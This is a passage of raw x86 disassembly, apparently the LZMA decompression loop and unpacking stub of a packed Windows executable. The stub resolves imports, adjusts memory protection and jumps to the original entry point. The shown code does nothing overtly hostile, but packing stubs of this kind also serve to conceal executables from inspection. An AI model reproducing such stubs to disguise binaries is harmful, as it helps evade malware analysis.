  44ce72:	mov    WORD PTR [ebp+0x0],cx
  44ce76:	jmp    0x44cdff
  44ce78:	mov    edx,DWORD PTR [esp+0x74]
  44ce7c:	mov    eax,esi
  44ce7e:	mov    ecx,DWORD PTR [esp+0xa0]
  44ce85:	mov    BYTE PTR [esp+0x73],al
  44ce89:	mov    BYTE PTR [edx+ecx*1],al
  44ce8c:	inc    edx
  44ce8d:	cmp    DWORD PTR [esp+0x60],0x3
  44ce92:	mov    DWORD PTR [esp+0x74],edx
  44ce96:	jg     0x44cea5
  44ce98:	mov    DWORD PTR [esp+0x60],0x0
  44cea0:	jmp    0x44d5c0
  44cea5:	cmp    DWORD PTR [esp+0x60],0x9
  44ceaa:	jg     0x44ceb6
  44ceac:	sub    DWORD PTR [esp+0x60],0x3
  44ceb1:	jmp    0x44d5c0
  44ceb6:	sub    DWORD PTR [esp+0x60],0x6
  44cebb:	jmp    0x44d5c0
  44cec0:	mov    ecx,DWORD PTR [esp+0x48]
  44cec4:	sub    edi,eax
  44cec6:	mov    esi,DWORD PTR [esp+0x60]
  44ceca:	sub    ecx,eax
  44cecc:	mov    eax,edx
  44cece:	shr    ax,0x5
  44ced2:	sub    dx,ax
  44ced5:	cmp    ecx,0xffffff
  44cedb:	mov    WORD PTR [ebp+0x0],dx
  44cedf:	mov    ebp,DWORD PTR [esp+0x78]
  44cee3:	lea    esi,[ebp+esi*2+0x0]
  44cee7:	mov    DWORD PTR [esp+0x38],esi
  44ceeb:	ja     0x44cf03
  44ceed:	cmp    ebx,DWORD PTR [esp+0x4c]
  44cef1:	je     0x44d5e8
  44cef7:	movzx  eax,BYTE PTR [ebx]
  44cefa:	shl    edi,0x8
  44cefd:	shl    ecx,0x8
  44cf00:	inc    ebx
  44cf01:	or     edi,eax
  44cf03:	mov    ebp,DWORD PTR [esp+0x38]
  44cf07:	mov    eax,ecx
  44cf09:	shr    eax,0xb
  44cf0c:	mov    dx,WORD PTR [ebp+0x180]
  44cf13:	movzx  ebp,dx
  44cf16:	imul   eax,ebp
  44cf19:	cmp    edi,eax
  44cf1b:	jae    0x44cf6f
  44cf1d:	mov    esi,eax
  44cf1f:	mov    eax,0x800
  44cf24:	sub    eax,ebp
  44cf26:	mov    ebp,DWORD PTR [esp+0x58]
  44cf2a:	sar    eax,0x5
  44cf2d:	mov    ecx,DWORD PTR [esp+0x54]
  44cf31:	lea    eax,[edx+eax*1]
  44cf34:	mov    edx,DWORD PTR [esp+0x38]
  44cf38:	mov    DWORD PTR [esp+0x50],ecx
  44cf3c:	mov    ecx,DWORD PTR [esp+0x78]
  44cf40:	mov    WORD PTR [edx+0x180],ax
  44cf47:	mov    eax,DWORD PTR [esp+0x5c]
  44cf4b:	mov    DWORD PTR [esp+0x54],ebp
  44cf4f:	mov    DWORD PTR [esp+0x58],eax
  44cf53:	xor    eax,eax
  44cf55:	cmp    DWORD PTR [esp+0x60],0x6
  44cf5a:	setg   al
  44cf5d:	add    ecx,0x664
  44cf63:	lea    eax,[eax+eax*2]
  44cf66:	mov    DWORD PTR [esp+0x60],eax
  44cf6a:	jmp    0x44d1e3
  44cf6f:	mov    esi,ecx
  44cf71:	sub    edi,eax
  44cf73:	sub    esi,eax
  44cf75:	mov    eax,edx
  44cf77:	shr    ax,0x5
  44cf7b:	mov    ecx,DWORD PTR [esp+0x38]
  44cf7f:	sub    dx,ax
  44cf82:	cmp    esi,0xffffff
  44cf88:	mov    WORD PTR [ecx+0x180],dx
  44cf8f:	ja     0x44cfa7
  44cf91:	cmp    ebx,DWORD PTR [esp+0x4c]
  44cf95:	je     0x44d5e8
  44cf9b:	movzx  eax,BYTE PTR [ebx]
  44cf9e:	shl    edi,0x8
  44cfa1:	shl    esi,0x8
  44cfa4:	inc    ebx
  44cfa5:	or     edi,eax
  44cfa7:	mov    ebp,DWORD PTR [esp+0x38]
  44cfab:	mov    edx,esi
  44cfad:	shr    edx,0xb
  44cfb0:	mov    cx,WORD PTR [ebp+0x198]
  44cfb7:	movzx  eax,cx
  44cfba:	imul   edx,eax
  44cfbd:	cmp    edi,edx
  44cfbf:	jae    0x44d0a8
  44cfc5:	mov    ebp,0x800
  44cfca:	mov    esi,edx
  44cfcc:	sub    ebp,eax
  44cfce:	mov    DWORD PTR [esp+0x34],0x800
  44cfd6:	mov    eax,ebp
  44cfd8:	sar    eax,0x5
  44cfdb:	lea    eax,[ecx+eax*1]
  44cfde:	mov    ecx,DWORD PTR [esp+0x38]
  44cfe2:	mov    WORD PTR [ecx+0x198],ax
  44cfe9:	mov    eax,DWORD PTR [esp+0x60]
  44cfed:	mov    ecx,DWORD PTR [esp+0x44]
  44cff1:	shl    eax,0x5
  44cff4:	add    eax,DWORD PTR [esp+0x78]
  44cff8:	cmp    edx,0xffffff
  44cffe:	lea    ebp,[eax+ecx*2]
  44d001:	ja     0x44d019
  44d003:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d007:	je     0x44d5e8
  44d00d:	movzx  eax,BYTE PTR [ebx]
  44d010:	shl    edi,0x8
  44d013:	shl    esi,0x8
  44d016:	inc    ebx
  44d017:	or     edi,eax
  44d019:	mov    dx,WORD PTR [ebp+0x1e0]
  44d020:	mov    eax,esi
  44d022:	shr    eax,0xb
  44d025:	movzx  ecx,dx
  44d028:	imul   eax,ecx
  44d02b:	cmp    edi,eax
  44d02d:	jae    0x44d08f
  44d02f:	sub    DWORD PTR [esp+0x34],ecx
  44d033:	sar    DWORD PTR [esp+0x34],0x5
  44d038:	mov    esi,DWORD PTR [esp+0x34]
  44d03c:	mov    DWORD PTR [esp+0x48],eax
  44d040:	cmp    DWORD PTR [esp+0x74],0x0
  44d045:	lea    eax,[edx+esi*1]
  44d048:	mov    WORD PTR [ebp+0x1e0],ax
  44d04f:	je     0x44d5e8
  44d055:	xor    eax,eax
  44d057:	cmp    DWORD PTR [esp+0x60],0x6
  44d05c:	mov    ebp,DWORD PTR [esp+0xa0]
  44d063:	mov    edx,DWORD PTR [esp+0x74]
  44d067:	setg   al
  44d06a:	lea    eax,[eax+eax*1+0x9]
  44d06e:	mov    DWORD PTR [esp+0x60],eax
  44d072:	mov    eax,DWORD PTR [esp+0x74]
  44d076:	sub    eax,DWORD PTR [esp+0x5c]
  44d07a:	mov    al,BYTE PTR [ebp+eax*1+0x0]
  44d07e:	mov    BYTE PTR [esp+0x73],al
  44d082:	mov    BYTE PTR [edx+ebp*1],al
  44d085:	inc    edx
  44d086:	mov    DWORD PTR [esp+0x74],edx
  44d08a:	jmp    0x44d5c0
  44d08f:	sub    esi,eax
  44d091:	sub    edi,eax
  44d093:	mov    eax,edx
  44d095:	shr    ax,0x5
  44d099:	sub    dx,ax
  44d09c:	mov    WORD PTR [ebp+0x1e0],dx
  44d0a3:	jmp    0x44d1c7
  44d0a8:	mov    eax,ecx
  44d0aa:	sub    esi,edx
  44d0ac:	shr    ax,0x5
  44d0b0:	mov    ebp,DWORD PTR [esp+0x38]
  44d0b4:	sub    cx,ax
  44d0b7:	sub    edi,edx
  44d0b9:	cmp    esi,0xffffff
  44d0bf:	mov    WORD PTR [ebp+0x198],cx
  44d0c6:	ja     0x44d0de
  44d0c8:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d0cc:	je     0x44d5e8
  44d0d2:	movzx  eax,BYTE PTR [ebx]
  44d0d5:	shl    edi,0x8
  44d0d8:	shl    esi,0x8
  44d0db:	inc    ebx
  44d0dc:	or     edi,eax
  44d0de:	mov    ecx,DWORD PTR [esp+0x38]
  44d0e2:	mov    eax,esi
  44d0e4:	shr    eax,0xb
  44d0e7:	mov    dx,WORD PTR [ecx+0x1b0]
  44d0ee:	movzx  ecx,dx
  44d0f1:	imul   eax,ecx
  44d0f4:	cmp    edi,eax
  44d0f6:	jae    0x44d11b
  44d0f8:	mov    esi,eax
  44d0fa:	mov    eax,0x800
  44d0ff:	sub    eax,ecx
  44d101:	mov    ebp,DWORD PTR [esp+0x38]
  44d105:	sar    eax,0x5
  44d108:	lea    eax,[edx+eax*1]
  44d10b:	mov    WORD PTR [ebp+0x1b0],ax
  44d112:	mov    eax,DWORD PTR [esp+0x58]
  44d116:	jmp    0x44d1bb
  44d11b:	mov    ecx,esi
  44d11d:	sub    edi,eax
  44d11f:	sub    ecx,eax
  44d121:	mov    eax,edx
  44d123:	shr    ax,0x5
  44d127:	sub    dx,ax
  44d12a:	mov    eax,DWORD PTR [esp+0x38]
  44d12e:	cmp    ecx,0xffffff
  44d134:	mov    WORD PTR [eax+0x1b0],dx
  44d13b:	ja     0x44d153
  44d13d:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d141:	je     0x44d5e8
  44d147:	movzx  eax,BYTE PTR [ebx]
  44d14a:	shl    edi,0x8
  44d14d:	shl    ecx,0x8
  44d150:	inc    ebx
  44d151:	or     edi,eax
  44d153:	mov    esi,DWORD PTR [esp+0x38]
  44d157:	mov    eax,ecx
  44d159:	shr    eax,0xb
  44d15c:	mov    dx,WORD PTR [esi+0x1c8]
  44d163:	movzx  ebp,dx
  44d166:	imul   eax,ebp
  44d169:	cmp    edi,eax
  44d16b:	jae    0x44d18d
  44d16d:	mov    esi,eax
  44d16f:	mov    eax,0x800
  44d174:	sub    eax,ebp
  44d176:	mov    ebp,DWORD PTR [esp+0x38]
  44d17a:	sar    eax,0x5
  44d17d:	lea    eax,[edx+eax*1]
  44d180:	mov    WORD PTR [ebp+0x1c8],ax
  44d187:	mov    eax,DWORD PTR [esp+0x54]
  44d18b:	jmp    0x44d1b3
  44d18d:	mov    esi,ecx
  44d18f:	sub    edi,eax
  44d191:	sub    esi,eax
  44d193:	mov    eax,edx
  44d195:	shr    ax,0x5
  44d199:	sub    dx,ax
  44d19c:	mov    eax,DWORD PTR [esp+0x38]
  44d1a0:	mov    WORD PTR [eax+0x1c8],dx
  44d1a7:	mov    edx,DWORD PTR [esp+0x54]
  44d1ab:	mov    eax,DWORD PTR [esp+0x50]
  44d1af:	mov    DWORD PTR [esp+0x50],edx
  44d1b3:	mov    ecx,DWORD PTR [esp+0x58]
  44d1b7:	mov    DWORD PTR [esp+0x54],ecx
  44d1bb:	mov    ebp,DWORD PTR [esp+0x5c]
  44d1bf:	mov    DWORD PTR [esp+0x5c],eax
  44d1c3:	mov    DWORD PTR [esp+0x58],ebp
  44d1c7:	xor    eax,eax
  44d1c9:	cmp    DWORD PTR [esp+0x60],0x6
  44d1ce:	setg   al
  44d1d1:	mov    ecx,DWORD PTR [esp+0x78]
  44d1d5:	add    ecx,0xa68
  44d1db:	lea    eax,[eax+eax*2+0x8]
  44d1df:	mov    DWORD PTR [esp+0x60],eax
  44d1e3:	cmp    esi,0xffffff
  44d1e9:	ja     0x44d201
  44d1eb:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d1ef:	je     0x44d5e8
  44d1f5:	movzx  eax,BYTE PTR [ebx]
  44d1f8:	shl    edi,0x8
  44d1fb:	shl    esi,0x8
  44d1fe:	inc    ebx
  44d1ff:	or     edi,eax
  44d201:	mov    dx,WORD PTR [ecx]
  44d204:	mov    eax,esi
  44d206:	shr    eax,0xb
  44d209:	movzx  ebp,dx
  44d20c:	imul   eax,ebp
  44d20f:	cmp    edi,eax
  44d211:	jae    0x44d242
  44d213:	mov    DWORD PTR [esp+0x48],eax
  44d217:	mov    eax,0x800
  44d21c:	sub    eax,ebp
  44d21e:	shl    DWORD PTR [esp+0x44],0x4
  44d223:	sar    eax,0x5
  44d226:	mov    DWORD PTR [esp+0x2c],0x0
  44d22e:	lea    eax,[edx+eax*1]
  44d231:	mov    WORD PTR [ecx],ax
  44d234:	mov    eax,DWORD PTR [esp+0x44]
  44d238:	lea    ecx,[ecx+eax*1+0x4]
  44d23c:	mov    DWORD PTR [esp+0x10],ecx
  44d240:	jmp    0x44d2b4
  44d242:	sub    esi,eax
  44d244:	sub    edi,eax
  44d246:	mov    eax,edx
  44d248:	shr    ax,0x5
  44d24c:	sub    dx,ax
  44d24f:	cmp    esi,0xffffff
  44d255:	mov    WORD PTR [ecx],dx
  44d258:	ja     0x44d270
  44d25a:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d25e:	je     0x44d5e8
  44d264:	movzx  eax,BYTE PTR [ebx]
  44d267:	shl    edi,0x8
  44d26a:	shl    esi,0x8
  44d26d:	inc    ebx
  44d26e:	or     edi,eax
  44d270:	mov    dx,WORD PTR [ecx+0x2]
  44d274:	mov    eax,esi
  44d276:	shr    eax,0xb
  44d279:	movzx  ebp,dx
  44d27c:	imul   eax,ebp
  44d27f:	cmp    edi,eax
  44d281:	jae    0x44d2be
  44d283:	mov    DWORD PTR [esp+0x48],eax
  44d287:	mov    eax,0x800
  44d28c:	sub    eax,ebp
  44d28e:	shl    DWORD PTR [esp+0x44],0x4
  44d293:	sar    eax,0x5
  44d296:	mov    DWORD PTR [esp+0x2c],0x8
  44d29e:	lea    eax,[edx+eax*1]
  44d2a1:	mov    edx,DWORD PTR [esp+0x44]
  44d2a5:	mov    WORD PTR [ecx+0x2],ax
  44d2a9:	lea    ecx,[ecx+edx*1+0x104]
  44d2b0:	mov    DWORD PTR [esp+0x10],ecx
  44d2b4:	mov    DWORD PTR [esp+0x30],0x3
  44d2bc:	jmp    0x44d2ed
  44d2be:	sub    esi,eax
  44d2c0:	sub    edi,eax
  44d2c2:	mov    eax,edx
  44d2c4:	mov    DWORD PTR [esp+0x48],esi
  44d2c8:	shr    ax,0x5
  44d2cc:	mov    DWORD PTR [esp+0x2c],0x10
  44d2d4:	sub    dx,ax
  44d2d7:	mov    DWORD PTR [esp+0x30],0x8
  44d2df:	mov    WORD PTR [ecx+0x2],dx
  44d2e3:	add    ecx,0x204
  44d2e9:	mov    DWORD PTR [esp+0x10],ecx
  44d2ed:	mov    ecx,DWORD PTR [esp+0x30]
  44d2f1:	mov    edx,0x1
  44d2f6:	mov    DWORD PTR [esp+0x28],ecx
  44d2fa:	lea    ebp,[edx+edx*1]
  44d2fd:	mov    esi,DWORD PTR [esp+0x10]
  44d301:	add    esi,ebp
  44d303:	cmp    DWORD PTR [esp+0x48],0xffffff
  44d30b:	ja     0x44d325
  44d30d:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d311:	je     0x44d5e8
  44d317:	shl    DWORD PTR [esp+0x48],0x8
  44d31c:	movzx  eax,BYTE PTR [ebx]
  44d31f:	shl    edi,0x8
  44d322:	inc    ebx
  44d323:	or     edi,eax
  44d325:	mov    eax,DWORD PTR [esp+0x48]
  44d329:	mov    dx,WORD PTR [esi]
  44d32c:	shr    eax,0xb
  44d32f:	movzx  ecx,dx
  44d332:	imul   eax,ecx
  44d335:	cmp    edi,eax
  44d337:	jae    0x44d351
  44d339:	mov    DWORD PTR [esp+0x48],eax
  44d33d:	mov    eax,0x800
  44d342:	sub    eax,ecx
  44d344:	sar    eax,0x5
  44d347:	lea    eax,[edx+eax*1]
  44d34a:	mov    edx,ebp
  44d34c:	mov    WORD PTR [esi],ax
  44d34f:	jmp    0x44d366
  44d351:	sub    DWORD PTR [esp+0x48],eax
  44d355:	sub    edi,eax
  44d357:	mov    eax,edx
  44d359:	shr    ax,0x5
  44d35d:	sub    dx,ax
  44d360:	mov    WORD PTR [esi],dx
  44d363:	lea    edx,[ebp+0x1]
  44d366:	mov    esi,DWORD PTR [esp+0x28]
  44d36a:	dec    esi
  44d36b:	mov    DWORD PTR [esp+0x28],esi
  44d36f:	jne    0x44d2fa
  44d371:	mov    cl,BYTE PTR [esp+0x30]
  44d375:	mov    eax,0x1
  44d37a:	shl    eax,cl
  44d37c:	sub    edx,eax
  44d37e:	add    edx,DWORD PTR [esp+0x2c]
  44d382:	cmp    DWORD PTR [esp+0x60],0x3
  44d387:	mov    DWORD PTR [esp+0xc],edx
  44d38b:	jg     0x44d578
  44d391:	add    DWORD PTR [esp+0x60],0x7
  44d396:	cmp    edx,0x3
  44d399:	mov    eax,edx
  44d39b:	jle    0x44d3a2
  44d39d:	mov    eax,0x3
  44d3a2:	mov    esi,DWORD PTR [esp+0x78]
  44d3a6:	shl    eax,0x7
  44d3a9:	mov    DWORD PTR [esp+0x24],0x6
  44d3b1:	lea    eax,[esi+eax*1+0x360]
  44d3b8:	mov    DWORD PTR [esp+0x8],eax
  44d3bc:	mov    eax,0x1
  44d3c1:	lea    ebp,[eax+eax*1]
  44d3c4:	mov    esi,DWORD PTR [esp+0x8]
  44d3c8:	add    esi,ebp
  44d3ca:	cmp    DWORD PTR [esp+0x48],0xffffff
  44d3d2:	ja     0x44d3ec
  44d3d4:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d3d8:	je     0x44d5e8
  44d3de:	shl    DWORD PTR [esp+0x48],0x8
  44d3e3:	movzx  eax,BYTE PTR [ebx]
  44d3e6:	shl    edi,0x8
  44d3e9:	inc    ebx
  44d3ea:	or     edi,eax
  44d3ec:	mov    eax,DWORD PTR [esp+0x48]
  44d3f0:	mov    dx,WORD PTR [esi]
  44d3f3:	shr    eax,0xb
  44d3f6:	movzx  ecx,dx
  44d3f9:	imul   eax,ecx
  44d3fc:	cmp    edi,eax
  44d3fe:	jae    0x44d418
  44d400:	mov    DWORD PTR [esp+0x48],eax
  44d404:	mov    eax,0x800
  44d409:	sub    eax,ecx
  44d40b:	sar    eax,0x5
  44d40e:	lea    eax,[edx+eax*1]
  44d411:	mov    WORD PTR [esi],ax
  44d414:	mov    eax,ebp
  44d416:	jmp    0x44d42d
  44d418:	sub    DWORD PTR [esp+0x48],eax
  44d41c:	sub    edi,eax
  44d41e:	mov    eax,edx
  44d420:	shr    ax,0x5
  44d424:	sub    dx,ax
  44d427:	lea    eax,[ebp+0x1]
  44d42a:	mov    WORD PTR [esi],dx
  44d42d:	mov    ebp,DWORD PTR [esp+0x24]
  44d431:	dec    ebp
  44d432:	mov    DWORD PTR [esp+0x24],ebp
  44d436:	jne    0x44d3c1
  44d438:	lea    edx,[eax-0x40]
  44d43b:	cmp    edx,0x3
  44d43e:	mov    DWORD PTR [esp],edx
  44d441:	jle    0x44d56e
  44d447:	mov    eax,edx
  44d449:	mov    esi,edx
  44d44b:	sar    eax,1
  44d44d:	and    esi,0x1
  44d450:	lea    ecx,[eax-0x1]
  44d453:	or     esi,0x2
  44d456:	cmp    edx,0xd
  44d459:	mov    DWORD PTR [esp+0x20],ecx
  44d45d:	jg     0x44d47b
  44d45f:	mov    ebp,DWORD PTR [esp+0x78]
  44d463:	shl    esi,cl
  44d465:	add    edx,edx
  44d467:	mov    DWORD PTR [esp],esi
  44d46a:	lea    eax,[ebp+esi*2+0x0]
  44d46e:	sub    eax,edx
  44d470:	add    eax,0x55e
  44d475:	mov    DWORD PTR [esp+0x4],eax
  44d479:	jmp    0x44d4d1
  44d47b:	lea    edx,[eax-0x5]
  44d47e:	cmp    DWORD PTR [esp+0x48],0xffffff
  44d486:	ja     0x44d4a0
  44d488:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d48c:	je     0x44d5e8
  44d492:	shl    DWORD PTR [esp+0x48],0x8
  44d497:	movzx  eax,BYTE PTR [ebx]
  44d49a:	shl    edi,0x8
  44d49d:	inc    ebx
  44d49e:	or     edi,eax
  44d4a0:	shr    DWORD PTR [esp+0x48],1
  44d4a4:	add    esi,esi
  44d4a6:	cmp    edi,DWORD PTR [esp+0x48]
  44d4aa:	jb     0x44d4b3
  44d4ac:	sub    edi,DWORD PTR [esp+0x48]
  44d4b0:	or     esi,0x1
  44d4b3:	dec    edx
  44d4b4:	jne    0x44d47e
  44d4b6:	mov    eax,DWORD PTR [esp+0x78]
  44d4ba:	shl    esi,0x4
  44d4bd:	mov    DWORD PTR [esp],esi
  44d4c0:	add    eax,0x644
  44d4c5:	mov    DWORD PTR [esp+0x20],0x4
  44d4cd:	mov    DWORD PTR [esp+0x4],eax
  44d4d1:	mov    DWORD PTR [esp+0x1c],0x1
  44d4d9:	mov    eax,0x1
  44d4de:	mov    ebp,DWORD PTR [esp+0x4]
  44d4e2:	add    eax,eax
  44d4e4:	mov    DWORD PTR [esp+0x18],eax
  44d4e8:	add    ebp,eax
  44d4ea:	cmp    DWORD PTR [esp+0x48],0xffffff
  44d4f2:	ja     0x44d50c
  44d4f4:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d4f8:	je     0x44d5e8
  44d4fe:	shl    DWORD PTR [esp+0x48],0x8
  44d503:	movzx  eax,BYTE PTR [ebx]
  44d506:	shl    edi,0x8
  44d509:	inc    ebx
  44d50a:	or     edi,eax
  44d50c:	mov    eax,DWORD PTR [esp+0x48]
  44d510:	mov    dx,WORD PTR [ebp+0x0]
  44d514:	shr    eax,0xb
  44d517:	movzx  esi,dx
  44d51a:	imul   eax,esi
  44d51d:	cmp    edi,eax
  44d51f:	jae    0x44d53c
  44d521:	mov    DWORD PTR [esp+0x48],eax
  44d525:	mov    eax,0x800
  44d52a:	sub    eax,esi
  44d52c:	sar    eax,0x5
  44d52f:	lea    eax,[edx+eax*1]
  44d532:	mov    WORD PTR [ebp+0x0],ax
  44d536:	mov    eax,DWORD PTR [esp+0x18]
  44d53a:	jmp    0x44d55b
  44d53c:	sub    DWORD PTR [esp+0x48],eax
  44d540:	sub    edi,eax
  44d542:	mov    eax,edx
  44d544:	shr    ax,0x5
  44d548:	sub    dx,ax
  44d54b:	mov    eax,DWORD PTR [esp+0x18]
  44d54f:	mov    WORD PTR [ebp+0x0],dx
  44d553:	mov    edx,DWORD PTR [esp+0x1c]
  44d557:	inc    eax
  44d558:	or     DWORD PTR [esp],edx
  44d55b:	mov    ecx,DWORD PTR [esp+0x20]
  44d55f:	shl    DWORD PTR [esp+0x1c],1
  44d563:	dec    ecx
  44d564:	mov    DWORD PTR [esp+0x20],ecx
  44d568:	jne    0x44d4de
  44d56e:	mov    esi,DWORD PTR [esp]
  44d571:	inc    esi
  44d572:	mov    DWORD PTR [esp+0x5c],esi
  44d576:	je     0x44d5d1
  44d578:	mov    ecx,DWORD PTR [esp+0xc]
  44d57c:	mov    ebp,DWORD PTR [esp+0x74]
  44d580:	add    ecx,0x2
  44d583:	cmp    DWORD PTR [esp+0x5c],ebp
  44d587:	ja     0x44d5e8
  44d589:	mov    eax,DWORD PTR [esp+0xa0]
  44d590:	mov    edx,ebp
  44d592:	sub    eax,DWORD PTR [esp+0x5c]
  44d596:	add    edx,DWORD PTR [esp+0xa0]
  44d59d:	lea    esi,[eax+ebp*1]
  44d5a0:	mov    al,BYTE PTR [esi]
  44d5a2:	inc    esi
  44d5a3:	mov    BYTE PTR [esp+0x73],al
  44d5a7:	mov    BYTE PTR [edx],al
  44d5a9:	inc    edx
  44d5aa:	inc    DWORD PTR [esp+0x74]
  44d5ae:	dec    ecx
  44d5af:	je     0x44d5c0
  44d5b1:	mov    ebp,DWORD PTR [esp+0xa4]
  44d5b8:	cmp    DWORD PTR [esp+0x74],ebp
  44d5bc:	jb     0x44d5a0
  44d5be:	jmp    0x44d5d1
  44d5c0:	mov    eax,DWORD PTR [esp+0xa4]
  44d5c7:	cmp    DWORD PTR [esp+0x74],eax
  44d5cb:	jb     0x44cc8c
  44d5d1:	cmp    DWORD PTR [esp+0x48],0xffffff
  44d5d9:	ja     0x44d5f0
  44d5db:	cmp    ebx,DWORD PTR [esp+0x4c]
  44d5df:	mov    eax,0x1
  44d5e4:	je     0x44d60f
  44d5e6:	jmp    0x44d5ef
  44d5e8:	mov    eax,0x1
  44d5ed:	jmp    0x44d60f
  44d5ef:	inc    ebx
  44d5f0:	sub    ebx,DWORD PTR [esp+0x94]
  44d5f7:	xor    eax,eax
  44d5f9:	mov    edx,DWORD PTR [esp+0x9c]
  44d600:	mov    ecx,DWORD PTR [esp+0x74]
  44d604:	mov    DWORD PTR [edx],ebx
  44d606:	mov    ebx,DWORD PTR [esp+0xa8]
  44d60d:	mov    DWORD PTR [ebx],ecx
  44d60f:	add    esp,0x7c
  44d612:	pop    ebx
  44d613:	pop    esi
  44d614:	pop    edi
  44d615:	pop    ebp
  44d616:	add    esi,DWORD PTR [ebx-0x4]
  44d619:	add    edi,DWORD PTR [ebx-0x8]
  44d61c:	xor    eax,eax
  44d61e:	lea    ecx,[esp-0x100]
  44d625:	mov    esp,ebp
  44d627:	push   eax
  44d628:	cmp    esp,ecx
  44d62a:	jne    0x44d627
  44d62c:	mov    esp,ebp
  44d62e:	xor    ecx,ecx
  44d630:	pop    esi
  44d631:	lea    edi,[esi+0x4a000]
  44d637:	mov    eax,DWORD PTR [edi]
  44d639:	or     eax,eax
  44d63b:	je     0x44d679
  44d63d:	mov    ebx,DWORD PTR [edi+0x4]
  44d640:	lea    eax,[eax+esi*1+0x4d450]
  44d647:	add    ebx,esi
  44d649:	push   eax
  44d64a:	add    edi,0x8
  44d64d:	call   DWORD PTR [esi+0x4d4a0]
  44d653:	xchg   ebp,eax
  44d654:	mov    al,BYTE PTR [edi]
  44d656:	inc    edi
  44d657:	or     al,al
  44d659:	je     0x44d637
  44d65b:	mov    ecx,edi
  44d65d:	push   edi
  44d65e:	dec    eax
  44d65f:	repnz scas al,BYTE PTR es:[edi]
  44d661:	push   ebp
  44d662:	call   DWORD PTR [esi+0x4d4a4]
  44d668:	or     eax,eax
  44d66a:	je     0x44d673
  44d66c:	mov    DWORD PTR [ebx],eax
  44d66e:	add    ebx,0x4
  44d671:	jmp    0x44d654
  44d673:	call   DWORD PTR [esi+0x4d4b4]
  44d679:	mov    ebp,DWORD PTR [esi+0x4d4a8]
  44d67f:	lea    edi,[esi-0x1000]
  44d685:	mov    ebx,0x1000
  44d68a:	push   eax
  44d68b:	push   esp
  44d68c:	push   0x4
  44d68e:	push   ebx
  44d68f:	push   edi
  44d690:	call   ebp
  44d692:	lea    eax,[edi+0x20f]
  44d698:	and    BYTE PTR [eax],0x7f
  44d69b:	nop
  44d69c:	nop
  44d69d:	nop
  44d69e:	nop
  44d69f:	pop    eax
  44d6a0:	push   eax
  44d6a1:	push   esp
  44d6a2:	push   eax
  44d6a3:	push   ebx
  44d6a4:	push   edi
  44d6a5:	call   ebp
  44d6a7:	pop    eax
  44d6a8:	popa   
  44d6a9:	lea    eax,[esp-0x80]
  44d6ad:	push   0x0
  44d6af:	cmp    esp,eax
  44d6b1:	jne    0x44d6ad
  44d6b3:	sub    esp,0xffffff80
  44d6b6:	jmp    0x4208e8
	...
